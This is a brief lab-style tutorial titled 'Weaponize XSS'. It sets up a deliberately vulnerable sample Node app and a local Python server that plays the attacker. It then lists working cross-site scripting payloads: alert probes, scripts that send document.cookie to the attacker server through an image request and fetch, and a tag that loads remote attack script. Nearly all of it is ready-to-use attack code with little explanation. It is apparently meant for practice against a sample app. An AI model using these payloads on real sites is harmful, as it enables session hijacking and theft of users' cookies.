Weaponize XSS 
---

# Preparation 

setup target 

```shell
git clone git://github.com/auth0-blog/xss-sample-app
cd xss-sample-app
npm install 
node server.js
cd ..
```

setup attacker server 

```
python -m http.server 5000
```

# Identify XSS 

```
<script>alert(1)</script>
<img src=x onerror=alert(1)>
```

# Weaponize

exfiltrate 

```
<script>var i=new Image; i.src="http://localhost:5000/?"+ document.cookie</script>
<script>fetch(`http://localhost:5000/?data=${document.cookie}`)</script>
```

payload

```
<script src="http://localhost:5000/payload.js"></script>
```